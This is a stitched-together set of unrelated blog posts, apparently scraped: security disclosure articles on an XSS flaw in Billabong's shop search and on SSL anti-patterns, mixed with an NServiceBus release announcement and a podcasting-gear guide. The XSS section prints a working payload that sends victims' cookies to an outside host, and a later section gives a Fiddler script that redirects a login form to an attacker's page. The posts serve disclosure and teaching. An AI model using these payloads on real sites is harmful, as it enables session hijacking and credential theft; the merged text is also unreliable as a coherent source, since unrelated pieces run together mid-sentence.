back to this one.</p><a name='more'></a><h4>Sanitising user input</h4><p>The theory goes like this: expect any untrusted data to be malicious. What’s untrusted data? Anything that originates from outside the system and you don’t have absolute control over so that includes form data, query strings, cookies, other request headers, data from<em>other</em>systems (i.e. from web services) and basically anything that you can’t be 100% confident doesn’t contain evil things.</p><p>Evil things can be SQL injection, malicious files, attempts to traverse internal directory structures or XSS payloads. So what do you do about untrusted data? You try and filter it out and there are two ways to approach this:</p><ol><li><strong>Blacklist:</strong>You describe everything you know is<em>bad</em>, for example you don’t allow a&lt;script&gt; tag or quotes. The trick here is that you have to comprehensively come up with everything that you think might be bad and add it to the blacklist. If untrusted data contains one of these bad patterns, you reject it.</li><li><strong>Whitelist:</strong>You describe everything you know is<em>good</em>, for example letters and numbers. The trick here is that you have to comprehensively come up with everything that you think might be legitimately provided by a user and allow it. If untrusted data is not entirely made up from patterns in the whitelist, you reject it.</li></ol><p>Whitelists are almost always preferable because they’re very explicit; only describing what you know to be good is a very discrete way of handling untrusted data. The problem with blacklists is that you don’t know what you don’t know. For example, you decide that double quotes are evil as they could be used to break out of an HTML attribute but later on realise that angle brackets could do the same thing in some browsers even though the HTML would be malformed. Or an entirely new attack vector raises its head.</p><p>Whitelists can be<em>very</em>simple, for example if you expect an integer or a GUID for an ID it’s very simple to typecast it and ensure it complies to that pattern. Likewise, a pattern such as a URL or an email address can be assessed against a regular expression rather than just accepting whatever the user provides. Things like people’s names are a little harder (many an Irishman has been rejected by sites that disallow single quotes), but there is much discussion and many examples of regexes that facilitate natural language characters and punctuation. Of course they also need to be conscious of things like non-Latin characters but again, this is an often held discussion with many examples of how to allow the good stuff while keeping out the bad stuff.</p><p>So let’s get back to Billabong and look at sanitisation. They follow a pretty tried and (kind of) trusted pattern of repeating the search term in the URL so that when you search for something like “shirt”, you see this:</p><p><img width=\"650\" height=\"400\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Search term reflected in page body\" src=\"http://lh6.ggpht.com/-dX-eaItsbvk/UaZiumJFu4I/AAAAAAAAFYw/fW6s0AG05F0/image15.png?imgmax=800\" border=\"0\"></p><p>However, search for something like “&lt;script&gt;” and you’ll get this:</p><p><img width=\"650\" height=\"198\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Search for&lt;script&gt; rejected by input sanitisation\" src=\"http://lh6.ggpht.com/-ktsqf97wKBY/UaZivY8OYVI/AAAAAAAAFY4/D3_dYJroc90/image18.png?imgmax=800\" border=\"0\"></p><p>Clearly there’s some sanitisation going on here, it’s just a question of whether it’s sufficient. If we modify that slightly we’ll see that if the leading angle bracket is dropped then the search goes through just fine:</p><p><img width=\"650\" height=\"320\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Search for script&gt; is allowed\" src=\"http://lh5.ggpht.com/-4s4wxEIS-zI/UaZiv5D_WSI/AAAAAAAAFZA/tUhk7Xcs0-s/image21.png?imgmax=800\" border=\"0\"></p><p>But hang on – why allow a greater than but not a less than? It’s starting to look like tag-blacklisting which per the definition above, is always going to be a bit dodgy. By process of elimination it’s easy to discover which characters are allowed through and beyond the obvious alphanumeric ones, they include<strong>:/\\’;”%.?</strong></p><p><img width=\"650\" height=\"320\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"A successful search for the characters :/\\’;”%.?\" src=\"http://lh6.ggpht.com/-cQ5ZuU2sDuM/UaZiwjAFipI/AAAAAAAAFZI/I7JWkkQUJ7I/image24.png?imgmax=800\" border=\"0\"></p><p>Some of those are punctuation which you might find in a product name someone would legitimately search for, but probably not characters like a double quote, a semicolon or a percent. Perhaps there are edge cases, but as we’re about to see, it’s the sort of thing you want to have a genuine need for before using.</p><h4>Output encoding contexts</h4><p>If you’re reading this, chances are you know what HTML markup looks like. For example, a paragraph tag is represented in markup as&lt;p&gt; (this is painfully obvious but bear with me). Thing is though, if you wanted to render that tag into the browser – just like I have here – then the actual markup is&lt;p&gt; where the angle brackets are represented by HTML escape characters. If they weren’t escaped then you’d literally end up with a paragraph tag in the markup and it wouldn’t be visible in the browser.</p><p>Let’s go back to Billabong and take a look at the lifecycle of the untrusted data that is the search term. Firstly, it’s actually only rendered into the source code in one location and that’s in JavaScript. When we searched for “shirt”, it ended up in this script block (see the second line):</p><pre class=\"code\"><span style=\"background: white; color: blue\">&lt;</span><span style=\"background: white; color: maroon\">script</span><span style=\"background: white; color: red\">type</span><span style=\"background: white; color: blue\">=\"text/javascript\"&gt;var</span><span style=\"background: white; color: black\">keyword =</span><span style=\"background: white; color: #a31515\">'shirt'</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">ProductSquareDefault =</span><span style=\"background: white; color: #a31515\">'/images/placeholder-{0}.jpg'</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">quantityMin = 1;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">showOutOfStock =</span><span style=\"background: white; color: blue\">false</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">showProductsWithImageOnly =</span><span style=\"background: white; color: blue\">true</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">discount =</span><span style=\"background: white; color: blue\">null</span><span style=\"background: white; color: black\">;</span><span style=\"background: white; color: blue\">&lt;/</span><span style=\"background: white; color: maroon\">script</span><span style=\"background: white; color: blue\">&gt;</span></pre>It then got sent off to an API in the query string:<a title=\"https://au.shop.billabong.com/api/product/GetFiltersBySearchTerm?keyword=shirt&showSaleOnly=false\" href=\"https://au.shop.billabong.com/api/product/GetFiltersBySearchTerm?keyword=shirt&showSaleOnly=false\">https://au.shop.billabong.com/api/product/GetFiltersBySearchTerm?keyword=shirt&showSaleOnly=false<br></a><p>This API returns a JSON response with the results needed to build up the categories on the left under the search box (“Collections”, “Men”, “Women”, etc.) and then another API is called with the term in the query string again:<a href=\"https://au.shop.billabong.com/api/product/Search?filters=&keyword=shirt&showSaleOnly=false&buildLinks=true\">https://au.shop.billabong.com/api/product/Search?filters=&keyword=shirt&showSaleOnly=false&buildLinks=true</a></p><p>This then returns a<em>whopping</em>big JSON response of nearly 300kb (gzip, people!) with the individual results. All of this is orchestrated by a JavaScript file called<a href=\"https://au.shop.billabong.com/js/pages/search/search.js\">search.js</a>(minification, people!) which includes this piece of jQuery syntax:</p><pre class=\"code\"><span style=\"background: white; color: black\">$(</span><span style=\"background: white; color: #a31515\">'.search-form .searchkwd'</span><span style=\"background: white; color: black\">).val(keyword);</span></pre><p>The important thing in the context of output encoding is that this then sets the search term into the text box using the val() method in jQuery. This all happens in the DOM so there isn’t the same opportunity to exploit an XSS risk as if it was just reflected directly into the markup in the same way that we often see search features implemented. Yet there remains a risk…</p><p>Earlier we saw the word “shirt” appear in the JavaScript block which raises the question: is there any output encoding happening here? Let’s check by going back to one of the earlier searches which was for “script&gt;”. Here’s what we see:</p><pre class=\"code\"><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">keyword =</span><span style=\"background: white; color: #a31515\">'script&gt;'</span><span style=\"background: white; color: black\">;</span></pre><p>This is where the problem begins because there’s no encoding happening. Earlier on we talked about a greater than sign encoding to&gt; in HTML, what you have to remember is that in JavaScript it’s a totally different syntax and what you need there is \\x3c or in other words, this is what the script<em>should</em>look like:</p><pre class=\"code\"><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">keyword =</span><span style=\"background: white; color: #a31515\">'script\\x3c'</span><span style=\"background: white; color: black\">;</span></pre><p>That’s now enough to establish there’s an exploitable risk on the site, let’s look at how that might happen.</p><h4>Exploiting unsanitised data with unencoded output</h4><p>Remembering that the character<strong>:/\\’;”%.?</strong>are all allowed through the sanitisation and that it looks like they’ll happily be rendered as-is to the JavaScript context, the question now becomes “what can we do with this”? This a site that can be authenticated to and given that authenticated sessions on websites are almost always persisted by authentication cookies, let’s take a look at those. Of course there is a native browser defence against accessing cookies on the client side cookies and I wrote about it recently in<a href=\"http://www.troyhunt.com/2013/03/c-is-for-cookie-h-is-for-hacker.html\">C is for cookie, H is for hacker – understanding HTTP only and Secure cookies</a>.</p><p>That native defence is the HttpOnly cookie and when a cookie is flagged as such, it can’t be grabbed by JavaScript. However, here are Billabong’s cookies:</p><p><img width=\"688\" height=\"369\" title=\"image\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; margin: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"image\" src=\"http://lh5.ggpht.com/-LAFGSnIMJa0/UaZixGVC22I/AAAAAAAAFZQ/0rL3kL8vyew/image27.png?imgmax=800\" border=\"0\"></p><p>There is only one HttpOnly cookie and it’s the ASP.NET_SessionId which is HttpOnly by default. Given this is an ASP.NET app it’s also worth pointing out that were this site to be using the framework’s implementation of forms authentication we’d see a .ASPXAUTH cookie for persisting the authenticated session and it<em>would</em>be flagged as HttpOnly. Instead we see the highlighted CustomerSession cookie which is all that’s needed to steal the session – and it’s not HttpOnly. This is<em>precisely</em>why you’ll often hear people (myself included) say how it important it is to use existing, proven security implementations.</p><p>So that tells us enough to know that there’s something useful to be gained by grabbing cookies. Get that from a logged in user and you can become them. Let’s try this URL:<a title=\"https://au.shop.billabong.com/search?keyword=\\';location.href=\"http://hackyourself.troyhunt.com/Cookies/?c=\"%2BencodeURIComponent(document.cookie);//\" href=\"https://au.shop.billabong.com/search?keyword=\\';location.href=\"http://hackyourself.troyhunt.com/Cookies/?c=\"%2BencodeURIComponent(document.cookie);//\">https://au.shop.billabong.com/search?keyword=\\';location.href=\"http://hackyourself.troyhunt.com/Cookies/?c=\"%2BencodeURIComponent(document.cookie);//</a></p><p>You may be able to guess what’s in there but it makes a lot more sense when you see it rendered – without any output encoding – to the source of the page:</p><pre class=\"code\"><span style=\"background: white; color: blue\">var</span><span style=\"background: white; color: black\">keyword =</span><span style=\"background: white; color: #a31515\">'\\''</span><span style=\"background: white; color: black\">; location.href =</span><span style=\"background: white; color: #a31515\">\"http://hackyourself.troyhunt.com/Cookies/?c=\"</span><span style=\"background: white; color: black\">+ encodeURIComponent(document.cookie);</span><span style=\"background: white; color: green\">//';</span></pre><p>Make sense now? It breaks down into three parts:</p><ol><li>Close off the keyword variable assignment and terminate the statement.</li><li>Redirect the browser to my website along with all the URL encoded cookies that the browser can access (anything not flagged as HttpOnly).</li><li>Comment out the remaining statement (this is the characters normally used to close off the keyword string and terminate the statement).</li></ol><p>As a result of this, I now have your cookies and that includes your session ID:</p><p><img width=\"866\" height=\"534\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Stealing Billabong cookies\" src=\"http://lh4.ggpht.com/-QFj9UGnEAXI/UaZix9ZiQzI/AAAAAAAAFZY/D7g_pzhNElA/image31.png?imgmax=800\" border=\"0\"></p><p>Of course I (or an attacker) need to be able to get a victim to follow a link with the XSS payload in it<em>and</em>make sure it’s a victim that’s actually logged into Billabong at the time, but that’s precisely why we have all the defences discussed above.</p><h4>Somebody didn’t hack themselves first…</h4><p>This is precisely the sort of thing I was talking about the other day when I wrote<a href=\"http://www.troyhunt.com/2013/05/hack-yourself-first-how-to-go-on.html\">Hack yourself first – how to go on the offence before online attackers do</a>. Here we have three ridiculously simple risks that anyone can identify remotely (and someone obviously did):</p><ol><li>Insufficient untrusted data sanitisation</li><li>No output encoding whatsoever</li><li>Auth cookie not flagged as HttpOnly</li></ol><p>This is a really good example of how multiple independent risks can be chained together to create a single exploit. It also illustrates why each of those risks, whilst they might seem small and insignificant in isolation, are actually extremely important. Of course it’s entirely possible the developers weren’t aware of these and didn’t know what to look for in the first place, indeed that’s why I wrote the aforementioned post on hacking yourself and will be talking much, much more about this in the future. I thought this was a great example why.</p><h4>Disclosure</h4><p>This week I wrote about<a href=\"http://www.troyhunt.com/2013/05/the-responsibility-of-public-disclosure.html\">The responsibility of public disclosure</a>and the very disappointing responses I often have when doing my darndest to privately reach out to the owners of at-risk websites. Conversely, disclosures that went public straight away and got press resulted in very swift action and benefited those at risk and those who could do well to learn from the experience (namely other developers). I then laid out what IMHO are very practical, sensible guidelines I follow when writing about any risk.</p><p>In this case, it’s hardly a smoking gun and not something you can go out and do immediate damage with, it’s certainly not a Black and Decker case where there are public logs with user credentials in them. I reached out to Billabong via twitter (yes, it’s a manned account) three times, firstly<a href=\"https://twitter.com/troyhunt/status/338437306077810688\">on Sunday</a>and got no response then<a href=\"https://twitter.com/troyhunt/status/339148328078024705\">on Tuesday</a>then again<a href=\"https://twitter.com/troyhunt/status/339536663380381696\">on Wednesday</a>. No response. Zip. Nada.

It’s been over a year since we released version 3.0 and in that time, the adoption of NServiceBus has totally exploded. I know I always talk about the big brand names but there have been hundreds of small to medium companies that have been seeing real success on this platform.</p><p>OK – one big name. I feel like I have to. If you’ve been to McDonald’s and purchased a happy meal for your kids – that’s going through NServiceBus. Yeah, at any McDonald’s around the world – and not just happy meals.</p><h3>What’s in the box</h3><p>While NServiceBus has historically used MSMQ as its primary queuing infrastructure, we now support RabbitMQ and ActiveMQ out of the box so you have full AMQP compliance at the wire level, and we’re soon going to be releasing a fully supported IBM MQ transport.</p><p>You can see the complete release notes for version 4 of NServiceBus <a href=\"http://particular.net/blog/nservicebus-v4.0-release-notes\">here</a>.</p><p>For those organization who’ve been ignoring NServiceBus until now because they prefer having everything in a central database, we now support using database tables as queues. </p><p>While I’ve always been big on queuing infrastructure, I understand that it takes time for an organization to change and I hope that this will provide a smooth transition path.</p><h3>Try it online now</h3><p>If you’re in a locked-down corporate environment that won’t let you install anything on your box, but you’d still like to try NServiceBus out, we’ve got the solution for you.</p><p>Try our new hands-on labs – you’ll get remote access to a machine in the cloud with NServiceBus pre-installed on it ready to go.</p><p>We’ve even got a scale-out lab where you’ll see just how easy it is to build a 4 machine NServiceBus solution.</p><p><a href=\"http://particular.net/HandsOnLabs\">Try the labs</a>.</p><h3>Modeling</h3><p>I’ve talked before about some modeling tools we’ve been working on for NServiceBus and I’m happy to say that they’re now ready for public beta. Instead of the name NServiceBus Studio (which overlapped far to much with Visual Studio), we’re now calling this <a href=\"http://particular.net/ServiceMatrix\">ServiceMatrix</a>.</p><p><img src=\"http://particular.net/Media/Default/Studio/ServiceMatrixScreen.png\" alt=\"ServiceMatrix\" title=\"ServiceMatrix\" /></p><p>ServiceMatrix makes building message-driven service-oriented solutions an absolute joy allowing you to operate at much higher levels of abstraction. Find out more <a href=\"http://particular.net/ServiceMatrix\">here</a>.</p><h3>Debugging</h3><p>While the looser-coupling of message-driven systems makes them more scalable and maintainable, it does make debugging harder since you can’t just step-through one function to another when everything is invoked asynchronously.</p><p>For that reason, we’ve been working on visualization and management tooling to make things easier. By leveraging the built-in auditing of NServiceBus, we can show you the message causation chain – which command caused which event, which in turn caused what other messages to flow. We also hook into the error queue to show you when messages fail (in orange below) and the full stack trace of the exception.</p><p>Of course, you can always see the full body and headers of each message.</p><p><img src=\"http://particular.net/Media/Default/Profiler/InsightScreen.png\" alt=\"ServiceInsight\" title=\"ServiceInsight\" /></p><p>This tool, called <a href=\"http://particular.net/ServiceInsight\">ServiceInsight</a> is now in its second beta and the feedback has been overwhelming – “oh my God, how could you have waited this long to release this?! Even our testers and admins are using it.”.</p><h2>In Particular</h2><p><a href=\"http://particular.net\"><img src=\"http://particular.net/Themes/ParticularSoftware/Styles/images/logo.png\" title=\"Particular Software\" alt=\"Particular Software\" style=\"float:right; margin-left:10px; margin-bottom:10px; margin-right:10px; border:none;\" /></a>You might have noticed that all of these links are going to the <a href=\"http://particular.net\">Particular.net</a> domain, and that the existing NServiceBus.com now redirects there as well.</p><p>After talking things over internally, the team agreed that we wanted to be much more than “just” a service bus. The new products I mentioned above are the first step in that direction, but there is more to come.</p><p>We wanted a name that wouldn’t pigeon-hole us but, I’ve got to tell you, it’s extremely hard to find a name for a software company (and a corresponding domain) that isn’t already taken.</p><p>When we hit on the name Particular Software and saw that ParticularSoftware.com was open, we were quite thrilled. You see, we’re very particular about the software we use, and we want to write software for people who are just as discerning as us. Getting Particular.net was nice too.</p><h3>In closing</h3><p>I want to take this opportunity to thank our community for believing in us all this time, and an especially big thank you to our <a href=\"http://particular.net/champions\">community champions</a> who have been gently shepherding thousands of new users in their first NServiceBus steps.</p><p>To our partners that have been building solutions for their customers on NServiceBus – you have our deepest appreciation.

For example, there was the piece on<a href=\"http://www.troyhunt.com/2013/05/heres-why-you-cant-trust-ssl-logos-on.html\">why you can’t trust SSL logos</a>, then how<a href=\"http://www.troyhunt.com/2013/05/your-login-form-posts-to-https-but-you.html\">loading login forms over HTTP but posting to HTTPS is pointless</a>and most recently, why those<a href=\"http://www.troyhunt.com/2013/06/understanding-risk-of-mixed-content.html\">mixed content warnings mean easy pickings for attackers on the transport layer</a>. All of these involve working demonstrations against real sites who just don’t quite get HTTPS.</p><p>Today’s example is about what happens when a login page is loaded securely, albeit embedded within an insecure page. This is a common security anti-pattern and you’ll see it on many sites. The example in the video is from<a href=\"http://www.countdown.co.nz/\">Countdown in New Zealand</a>but again, there are countless others out there. Take a look at the video then I’ll come back to how I mounted the attack:</p><iframe width=\"100%\" height=\"480\" src=\"http://www.youtube.com/embed/Ma9uxvXv_00?feature=player_embedded\" frameborder=\"0\" allowfullscreen=\"\"></iframe><p>Make sense? In short, you can never trust the HTTP component of the communication and without the ability to see the URL in the browser<em>loaded over an HTTPS address with a valid certificate</em>, the SSL implementation is almost useless.</p><a name='more'></a><p>The mechanics of how I’ve demonstrated attacks against insufficient use of SSL involves using<a href=\"http://fiddler2.com/documentation/KnowledgeBase/FiddlerScript/ModifyRequestOrResponse\">Fiddler script</a>. Many of you may already be familiar with<a href=\"http://fiddler2.com/\">Fiddler</a>, the scripting option gives us the ability to manipulate unencrypted traffic on the wire just as an attacker might at any point in the network communication. Clearly an attacker at, say an ISP or running a rogue wireless hotspot wouldn’t be running Fiddler, but the mechanics of manipulating requests and responses is similar with other tools.</p><p>In this example I simply added the following script in the OnBeforeResponse event:</p><pre class=\"code\"><span style=\"color: blue\">if</span><span style=\"color: gray\">(</span><span style=\"color: black\">oSession</span><span style=\"color: gray\">.</span><span style=\"color: black\">HostnameIs</span><span style=\"color: gray\">(</span><span style=\"color: maroon\">\"www.countdown.co.nz\"</span><span style=\"color: gray\">)&&</span><span style=\"color: black\">oSession</span><span style=\"color: gray\">.</span><span style=\"color: black\">PathAndQuery</span><span style=\"color: gray\">==</span><span style=\"color: maroon\">\"/\"</span><span style=\"color: gray\">) {<br></span><span style=\"color: green\">// Remove any compression or chunking<br></span><span style=\"color: black\">oSession</span><span style=\"color: gray\">.</span><span style=\"color: black\">utilDecodeResponse</span><span style=\"color: gray\">();<br><br></span><span style=\"color: blue\">var</span><span style=\"color: black\">oBody</span><span style=\"color: gray\">=</span><span style=\"color: black\">System</span><span style=\"color: gray\">.</span><span style=\"color: black\">Text</span><span style=\"color: gray\">.</span><span style=\"color: black\">Encoding</span><span style=\"color: gray\">.</span><span style=\"color: black\">UTF8</span><span style=\"color: gray\">.</span><span style=\"color: black\">GetString</span><span style=\"color: gray\">(</span><span style=\"color: black\">oSession</span><span style=\"color: gray\">.</span><span style=\"color: black\">responseBodyBytes</span><span style=\"color: gray\">);<br><br></span><span style=\"color: green\">// Change the path of the login form<br></span><span style=\"color: black\">oBody</span><span style=\"color: gray\">=</span><span style=\"color: black\">oBody</span><span style=\"color: gray\">.</span><span style=\"color: black\">replace</span><span style=\"color: gray\">(</span><span style=\"color: maroon\">\"/onecard/panels/customer-login\"</span><span style=\"color: gray\">,</span><span style=\"color: maroon\"><br>\"http://hackyourself.troyhunt.com/Countdown\"</span><span style=\"color: gray\">);<br><br></span><span style=\"color: green\">// Set the response body to the changed body string<br></span><span style=\"color: black\">oSession</span><span style=\"color: gray\">.</span><span style=\"color: black\">utilSetResponseBody</span><span style=\"color: gray\">(</span><span style=\"color: black\">oBody</span><span style=\"color: gray\">);<br>}</span></pre><p>In other words, when the homepage is loaded simply replace the link to the login form from the original one to the attacker’s one that looks the same.

The problem, as you’ll see in the video below, is that it jeopardises the security of traffic going backwards and forwards over what otherwise appears to be a secure site, at least in terms of implementing SSL. This can lead to issues such as the theft of identity data, potentially including such personal information as social security numbers. Fortunately there’s a channel to report potentially fraudulent activity except that, well, this video explains it best:</p><iframe width=\"100%\" height=\"480\" src=\"http://www.youtube.com/embed/CSmacMZ0xZo?feature=player_embedded\" frameborder=\"0\" allowfullscreen></iframe><a name='more'></a><p>Of course it’s ironic that it’s the Social Security Administration that’s made a bit of a botch of this but it’s an all too familiar scenario.<a href=\"http://www.troyhunt.com/2012/07/lessons-in-website-security-anti.html\">Tesco did it</a>,<a href=\"http://www.troyhunt.com/2013/05/why-i-am-worlds-greatest-lover-and.html\">so did Versa Lift</a>,<a href=\"http://www.troyhunt.com/2013/04/5-ways-to-implement-https-in.html\">so did Top CashBack</a>and a heap of others I haven’t previously written about. It’s rampant.</p><p>That’s the risk covered, let’s focus on the fixes and they’re all dead easy:</p><ol><li>Embed external content explicitly via the HTTPS scheme. If you’re only serving the page over HTTPS anyway then it ensures no slip ups.</li><li>Use a protocol relative URL or in other words, embed resources such as the jQuery file in the example above as //ajax.googleapis.com/… Yes, I know it looks weird but it works and it means when the page is loaded over HTTP then the resource will be requested over HTTP. Load the page over HTTPS and the resource embeds over HTTPS.</li><li>Test your damn web pages! No seriously, this is a fundamentally basic flaw and as soon as you load the page most browsers will start complaining. Have we – even us developers – become so desensitised to security warnings that we totally ignore them?!</li></ol><p>For the curious, as I mention in the video this demonstration was achieved by mounting a man in the middle attack at the proxy level. I used<a href=\"http://fiddler2.com/\">Fiddler</a>as the proxy and<a href=\"http://fiddler2.com/documentation/KnowledgeBase/FiddlerScript/ModifyRequestOrResponse\">Fiddler Script</a>to modify the jQuery file in the OnBeforeResponse event. Whilst all this occurred within my PC, it demonstrates the alibility for it to happen at a proxy server anywhere – or at the internet gateway of your local cafe, or elsewhere in the ISP, or via a<a href=\"http://www.enigmacurry.com/category/diy/\">wiretap</a>on an enthernet cable or<a href=\"http://www.troyhunt.com/2013/04/the-beginners-guide-to-breaking-website.html\">as I’ve shown recently with the Pineapple</a>, via a rogue wireless access point the victim is connected to, possibly even without their knowledge.</p><p>Now as with my previous video on<a href=\"http://www.troyhunt.com/2013/05/your-login-form-posts-to-https-but-you.html\">the risk of loading login forms over HTTP</a>, many people will ask “Is this really a likely risk?” In fact that’s just<a href=\"https://twitter.com/paulswail/status/342836543855144960\">the discussion I had with Rob Conery</a>after the aforementioned post as even<a href=\"http://tekpub.com/\">TekPub</a>follows this pattern. I look at it like this: you implement SSL primarily because you’re concerned about the risk of someone intercepting your traffic. Assuming you acknowledge – and attempt to protect against – this risk, you accept that all the HTTP components of the communication remain vulnerable ergo you need to protect against the SSL anti-patterns mentioned here.</p><img src=\"http://feeds.feedburner.com/~r/TroyHunt/~4/pczeDYOJ1KU\" height=\"1\" width=\"1\"/>","author":"Troy Hunt","_id":{"$wrap":"$oid","v":1154}}

I'm assuming you're able to decide on your own topic/theme and spread the word about your new show.</p><h3><img title=\"BlogTalkRadio\"style=\"float: right; display: inline\"alt=\"BlogTalkRadio\"align=\"right\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_24.png\"width=\"350\"height=\"269\"/>Podcasting Equipment: Good, Better, Best</h3><p>Let's take a look at your options, ranked from Meh, through Good, Better, and Best.</p><h4></h4><h4>Meh</h4><p>You could use BlogTalkRadio as a super-quick way to jump-start your podcast, but there are some limitations. The benefits are that there's no software to use. It's basically a recorded conference call. They handle call-ins for guests, archiving, delivery and bandwidth. However, it goes up from Free to $39 a month or more quickly.</p><p>If you are serious about the future of your podcast I recommend that you put a little more work into and and you'll have lots more control and flexibility.</p><h4>Good</h4><p>If you are going to do Skype-based recordings or online interviews, get yourself a decent USB microphone/headset. These are NOT audiophile or good quality headphones - to be clear - but they are good enough for Skype and they are<strong>guaranteed</strong>to sound better than talking in to your laptop's tiny microphone hole.</p><p>Remember, your laptop may have cost $1000 but that tinny microphone hole was only $1 of the price. Have low expectations when using a laptop mic for a podcast.</p><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~bit.ly/bwbpodcasting\"><img title=\"Logitech USB Headset\"style=\"display: inline\"alt=\"Logitech USB Headset\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_10.png\"width=\"450\"height=\"329\"/></a></p><p>If you get a microphone/headset, get one that's USB to keep the audio digital all the way into the laptop. Don't use 1/8\" analog headphone jacks for recording.</p><p>For Skype interviews I use<a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.callburner.com\">CallBurner</a>to record the interviewee. Ideally your guest will also have a good USB microphone.<strong>Even better if your guest records a local file while you also record the Skype call</strong>. More on this technique further down in this post.</p><p><a href=\"http://feeds.hanselman.com/~/t/0/0/scotthanselman/~www.callburner.com\"><img title=\"CallBurner\"style=\"display: inline\"alt=\"CallBurner\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_461b66e6-5457-41cf-b66f-6ed8e73b152c.png\"width=\"531\"height=\"151\"/></a></p><h4>Better</h4><p>You may be able to get more flexibility if you move to a portable recorder. You can do interviews with these without carrying your laptop. You can also use your phone or tablet if you like. Ideally you'll want to make WAV files rather than MP3s.

This gives me THREE files.</p><p><img title=\"Three files for one phone call\"style=\"display: inline\"alt=\"Three files for one phone call\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_bfa8eca5-ee7f-4c9f-9c50-df98544ebb75.png\"width=\"600\"height=\"350\"/></p><p>Why three files? Well, one high quality of my recorded locally as a WAV. One of my co-host recorded in high quality as a WAV and one of BOTH of us. The trick is that we<strong>don't use the phone/Skype track.</strong></p><p>The phone track is just for lining up the two other tracks. This makes it sound like my co-host and I are in the same room together. See the three files below. My co-host is on top - notice her track is quiet. I'm on the bottom. The phone track is in the middle. Since these are separate tracks I can adjust Luvvie's track to make it louder and better match my track's volume.</p><p>I move our tracks around using the phone/Skype track as a guide. It tells me what we're supposed to sound like and gets our conversation in Sync. When I feel we are in sync, I<strong>mute</strong>the Skype track and listen to us talk.</p><p><img title=\"Editing in Audacity\"style=\"display: inline\"alt=\"Editing in Audacity\"src=\"http://www.hanselman.com/blog/content/binary/Windows-Live-Writer/4e937c2d8b4b_CC2A/image_b3a6ce1b-cddb-43a7-92ee-5f251b772376.png\"width=\"600\"height=\"450\"/></p><p>For complex show I'll use Adobe Audition and use the Effects Rack.

The idea of the “remember me” feature – and let’s face it, we’ve all seen this before – is that their authenticated state is persisted beyond the immediate scope of use. What this means is that they can close the browser, turn off the PC then come back tomorrow or next week or next month or however much later you determine is a reasonable timeframe and the site still knows who they are and offers them all the same features they had when they left it.</p><p>I’m talking about this little guy here:</p><p><img width=\"462\" height=\"82\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"\"Keep me logged in\" from Facebook\" src=\"http://lh4.ggpht.com/-JHWNglBmUDo/UdFF-IW2fwI/AAAAAAAAFbs/VFVvfJmNXbo/image31.png?imgmax=800\" border=\"0\"></p><p>Seems easy, right? It can be, but as you’ll see it’s also not uncommon to make an absolute mess of it and even when you do get it right, there’s a queue of people ready to tell you how it is, in fact, not quite right enough. Let’s start with the<em>really</em>wrong stuff and work from there.</p><a name='more'></a><h4>Anti-patterns</h4><p>This seems obvious, right? I mean the implementation of a “remember me” feature is pretty fundamental, not the sort of thing easily gotten wrong, surely? Apparently not.</p><p>Let me share two anti-patterns and we’ll discuss the problems with them before talking about how to do it right. The first example comes courtesy of Black& Decker, that would be the same B&D I recently wrote about in<a href=\"http://www.troyhunt.com/2013/05/security-is-hard-insecurity-is-easy.html\">Security is hard, insecurity is easy</a>. Here’s the idea when you login:</p><p><img width=\"488\" height=\"285\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Logging in to Black& Decker\" src=\"http://lh5.ggpht.com/-wvgqafGAVEU/UdFF-1kwgAI/AAAAAAAAFb0/r7vYPJJfcM8/image5.png?imgmax=800\" border=\"0\"></p><p>That’s all pretty standard, the interesting bit comes after you log in. Let’s take a look at the cookies:</p><p><img width=\"798\" height=\"332\" title=\"\" style=\"border-top: 0px; border-right: 0px; background-image: none; border-bottom: 0px; padding-top: 0px; padding-left: 0px; border-left: 0px; display: inline; padding-right: 0px\" alt=\"Black& Decker cookies\" src=\"http://lh5.ggpht.com/-eP31JfR5TiQ/UdFF_gwV6qI/AAAAAAAAFb8/pcnOHLUp0IM/image2.png?imgmax=800\" border=\"0\"></p><p>This is a fairly impressive set of cookies but it’s the highlighted ones that are genuinely interesting. These cookies won’t get set if you don’t check the “remember me” box so their function is purely to log you back in later on. My email address is pretty clearly in there, but that’s not my password, instead it appears to be some sort of impenetrable fortress of 